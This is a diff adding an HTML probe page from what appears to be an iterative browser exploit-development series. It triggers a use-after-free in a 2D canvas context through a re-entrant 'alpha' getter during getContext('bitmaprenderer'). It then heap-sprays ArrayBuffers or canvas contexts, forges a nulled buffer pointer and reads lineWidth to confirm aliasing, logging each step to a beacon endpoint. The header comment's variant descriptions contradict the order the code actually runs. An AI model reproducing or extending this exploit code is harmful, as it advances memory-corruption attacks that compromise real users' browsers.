@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P700 — isolate the faulting step (sendBeacon markers)</title>
+<script>
+'use strict';
+/* ============================================================
+ * P700 — which step faults? (in-window markers via sendBeacon)
+ *
+ * P699 (no-gap, nothing between spray and read) died INSIDE the
+ * silent window: G-ENTER beaconed, no G-SURVIVED. So no XHR/timer
+ * artifact caused it.
+ *
+ * Leading theory: the ArrayBuffer(768) spray does NOT reclaim the
+ * freed context. The ~CanvasRenderingContext2D destructor ran
+ * ~Vector on m_stateStack -> resetBufferAndCapacity() -> m_buffer
+ * = nullptr (this repo's own DEAD_ENDS.md). state() then
+ * dereferences nullptr -> SIGSEGV. That matches "died in window".
+ *
+ * This probe isolates the step using navigator.sendBeacon(), which
+ * is fire-and-forget and does NOT block the JS thread (unlike
+ * synchronous XHR), so it will not let the engine composite mid
+ * window while still giving per-step ordering.
+ *
+ * Variants (one per load, chosen by cookie/localStorage counter):
+ *   V0: UAF + read lineWidth immediately         (expect CRASH if m_buffer null)
+ *   V1: UAF + 200x AB(768) spray, NO forge, read (expect CRASH if no reclaim)
+ *   V2: UAF + 200x AB(768) spray + forge, read   (the P699 case)
+ *   V3: UAF + 200x SAME-TYPE ctx spray, read     (expect 1337: proven alias)
+ *
+ * If V1 crashes but V3 survives with 1337, the conclusion is:
+ * cross-type AB reclaim does NOT work here; same-type alias is the
+ * only valid reachable object, and the m_stateStack offset must be
+ * reached through the alias's own State (or the freed state buffer).
+ * ============================================================ */
+
+/* Non-blocking in-window marker. beacon.php reads $_GET, so the tag
+ * and data must live in the query string (a POST body would be dropped). */
+function sb(tag,data){
+  var url='/beacon.php?tag='+encodeURIComponent('P700-'+tag)+
+          '&data='+encodeURIComponent(String(data||'').slice(0,200))+'&t='+Date.now();
+  try{ if(navigator.sendBeacon && navigator.sendBeacon(url)) return; }catch(e){}
+  try{ var im=new Image(); im.src=url; }catch(e){}
+}
+function raw(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P700-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,200))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+function hex(v){return '0x'+BigInt(v).toString(16)}
+function f64bits(v){var bb=new ArrayBuffer(8);new Float64Array(bb)[0]=v;
+  return new BigUint64Array(bb)[0]}
+function desc(bits){
+  if(bits===BigInt('0x4094e40000000000')) return 'IS-1337';
+  if(bits>=BigInt('0x1000000000')&&bits<BigInt('0x8000000000')) return 'HEAP-PTR';
+  if(bits===BigInt(0)) return 'ZERO';
+  return 'OTHER';
+}
+
+function getV(){ try{var m=document.cookie.match(/p700v=(\d+)/); if(m) return parseInt(m[1]);}catch(e){}
+  try{var s=localStorage.getItem('p700v'); if(s!==null) return parseInt(s)||0;}catch(e){} return 0; }
+function setV(v){ try{document.cookie='p700v='+v+';path=/;max-age=86400';}catch(e){}
+  try{localStorage.setItem('p700v',String(v));}catch(e){} }
+
+var V=getV();
+if(V>3){ setV(0); V=0; }
+
+function run(){
+  raw('BOOT','variant=V'+V);
+  setV(V+1);   /* pre-increment so a crash advances to the next variant */
+  try{ go(V); }catch(e){ raw('ERR',(e.message||'').slice(0,120)); }
+}
+
+function go(V){
+  sb('V-ENTER','V'+V);
+
+  var inner=null;
+  var cv=document.createElement('canvas'); cv.width=1; cv.height=1;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){ inner=cv.getContext('2d'); return true; }});
+  cv.getContext('bitmaprenderer', o);
+  sb('V-UAF','inner='+(inner?'OK':'NULL'));
+  if(!inner){ raw('NOCTX',''); return; }
+
+  var abs=[], ctxs=[];
+
+  /* Variant order chosen for information per load:
+   *   V0 no spray          -> baseline: is the freed context readable at all?
+   *   V1 same-type spray   -> proven-good control (expect lw=1337)
+   *   V2 AB spray, no forge-> does AB(768) reclaim the slot?
+   *   V3 AB spray + null forge -> reproduces the P699 death shape
+   */
+  if(V===0){
+    sb('V-SPRAY','none-baseline');
+  } else if(V===1){
+    for(var s=0;s<200;s++){
+      var sc=document.createElement('canvas'); sc.width=1; sc.height=1;
+      var sx=sc.getContext('2d');
+      if(sx){ sx.lineWidth=1337.0; ctxs.push(sx); }
+    }
+    sb('V-SPRAY','200-SAMETYPE-control');
+  } else if(V===2){
+    for(var i=0;i<200;i++) abs.push(new ArrayBuffer(768));
+    sb('V-SPRAY','200-AB-no-forge');
+  } else {
+    for(var i2=0;i2<200;i2++) abs.push(new ArrayBuffer(768));
+    for(var f=0;f<abs.length;f++){
+      var bv=new BigUint64Array(abs[f]); var u=new Uint32Array(abs[f]);
+      bv[14]=BigInt(0); u[30]=1; u[31]=1;   /* m_buffer = 0 -> deliberate null probe */
+    }
+    sb('V-SPRAY','200-AB-forged-null');
+  }
+
+  sb('V-PRE-READ','about-to-read');
+
+  /* the read */
+  var lw=null, err=null;
+  try{ lw=inner.lineWidth; }catch(e){ err=(e.message||String(e)); }
+
+  sb('V-POST-READ', err!==null ? ('ERR:'+err.slice(0,60)) : ('lw='+lw));
+
+  if(err===null){
+    var bits=f64bits(lw);
+    sb('V-LW','bits='+hex(bits)+'|'+desc(bits));
+  }
+  sb('V-DONE','V'+V);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P700 — isolate faulting step</pre></body></html>
